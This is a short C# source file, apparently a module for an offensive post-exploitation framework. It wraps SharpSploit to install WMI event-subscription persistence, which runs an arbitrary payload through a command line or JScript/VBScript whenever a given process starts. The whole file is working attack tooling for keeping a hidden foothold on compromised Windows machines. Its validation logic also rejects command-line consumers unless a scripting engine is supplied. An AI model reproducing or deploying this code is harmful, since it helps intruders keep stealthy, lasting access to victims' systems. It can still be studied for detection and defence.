using System;

using SharpSploit.Persistence;

namespace ExecSploit
{
    public static class PersistWMI
    {
        public static string Execute(string EventName, string EventFilter, string EventConsumer, string Payload, string ProcessName = "", string ScriptingEngine = "")
        {
            try
            {
                WMI.EventFilter theEventFilter;
                WMI.EventConsumer theEventConsumer;
                WMI.ScriptingEngine theScriptingEngine;

                if (EventFilter.ToLower() == "processstart") { theEventFilter = WMI.EventFilter.ProcessStart; }
                else { return "WMI Persistence failed. Invalid Event Filter."; }

                if (EventConsumer.ToLower() == "commandline") { theEventConsumer = WMI.EventConsumer.CommandLine; }
                else if (EventConsumer.ToLower() == "activescript") { theEventConsumer = WMI.EventConsumer.ActiveScript; }
                else { return "WMI Persistence failed. Invalid Event Consumer."; }

                if (ScriptingEngine.ToLower() == "jscript") { theScriptingEngine = WMI.ScriptingEngine.JScript; }
                else if (ScriptingEngine.ToLower() == "vbscript") { theScriptingEngine = WMI.ScriptingEngine.VBScript; }
                else { return "WMI Persistence failed. Invalid Scripting Engine."; }

                if (WMI.InstallWMIPersistence(EventName, theEventFilter, theEventConsumer, Payload, ProcessName, theScriptingEngine))
                {
                    return "WMI Persistence suceeded for: " + EventName;
                }
                return "WMI Persistence failed for: " + EventName;
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}